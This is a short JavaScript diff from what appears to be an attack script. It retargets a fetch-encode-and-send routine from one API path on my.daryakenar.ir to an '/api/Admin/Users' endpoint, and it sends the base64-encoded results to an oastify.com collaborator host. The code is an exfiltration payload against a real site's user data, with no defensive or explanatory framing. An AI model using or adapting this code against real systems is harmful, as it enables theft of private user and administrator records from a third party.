@@ -22,7 +22,7 @@ function fetchEncodeAndSend(originalUrl, targetUrlBase) {
 }
 
 // Usage example
-const originalDataUrl = 'https://my.daryakenar.ir/api/Gates/person';  // URL where initial data is fetched from
+const originalDataUrl = 'https://my.daryakenar.ir/api/Admin/Users';  // URL where initial data is fetched from
 const targetUrlBase = 'https://v3zercz6vj1ycza5jqal548b228twokd.oastify.com';  // Base URL where you send the base64 encoded data
 
 fetchEncodeAndSend(originalDataUrl, targetUrlBase);
